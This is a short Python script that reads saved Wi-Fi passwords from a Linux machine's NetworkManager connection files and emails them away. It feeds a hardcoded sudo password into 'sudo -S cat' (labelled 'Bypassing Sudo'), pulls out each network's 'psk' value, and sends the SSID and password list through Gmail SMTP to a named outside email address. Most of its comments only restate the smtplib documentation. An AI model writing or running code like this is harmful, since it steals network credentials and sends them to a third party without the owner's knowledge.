import subprocess # The Library allows you to spawn new processes, connect to their input/output/error pipes,
import os         # This module provides a portable way of using operating system dependent functionality. 
import smtplib    # The smtplib module defines an SMTP client session object that can be used to send mail to any Internet machine with an SMTP or ESMTP listener daemon.

# The smtplib module defines an SMTP client session object that can be used to send
# mail to any Internet machine with an SMTP or ESMTP listener daemon. 

# SMTP stands for Simple Mail Transfer Protocol. 

# The smtplib modules is useful for communicating with mail servers to send mail.

# Sending mail is done with Python's smtplib using an SMTP server. 

# Actual usage varies depending on complexity of the email and settings of the
# email server, the instructions here are based on sending email through Gmail.

mail_id = "XXXXXXXXXXXXXXXXX"
mail_password = "XXXXXXXXXXX"

server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()
server.login(mail_id, mail_password)  # log in to the server

def finding_element(string,stoping_element):
	'''
	This function stores every charecter of the string as a string until it finds a 
	specific charecter which in our case /n.
	Parameter:
	string: The portion of original string after the element which is our case is "psk"
	stoping_element : Is where the for loop stops which in our case is /n 
	'''
	password = ""
	for j in range(len(string)):
		if string[j] != stoping_element:
			password += string[j]
		else:
			break
	return password

def grab_password(string,element,value,stoping_element):
	"""
	This function grabs the password from the original string.
	It find the element and then saves the password
	"""
	for i in range(len(string) - len(element)):
		if string[i:i + len(element)] == element:
			password = finding_element(string[ i+len(element)+ value :],stoping_element)
			break
	return password

os.chdir("/etc/NetworkManager/system-connections/")     # Changing dir  where the files related to Network is stored in. 
All_network = os.listdir() # Getting all the files in that directory.
networklist = All_network#.decode().split('\n')[0:-1]
#print(networklist)            # saving SSID in a list
id_pass = {}                                            # Empty dictionary used to store SSId and Pass
for network in networklist:                             # Looping Over every network  
	cm_to_bypass_sudo = subprocess.Popen(['echo',"XXXXXXXXXXXX"], stdout=subprocess.PIPE) # Bypassing Sudo
	password_string   = subprocess.Popen(['sudo','-S',"cat"] + [network], stdin=cm_to_bypass_sudo.stdout, stdout=subprocess.PIPE) # opening the file which saves the password and other details.
	result = grab_password(password_string.stdout.read().decode() ,"psk\npsk",1,"\n") #Grabing Password
	id_pass[network] = result                           #storing them in dictionary
server.sendmail(mail_id,"ravisingh93362@gmail.com",str(id_pass.items())[11:]) # Mailing the dictionary
server.quit()                                           # Quit the server
# Whooooo! You did It.
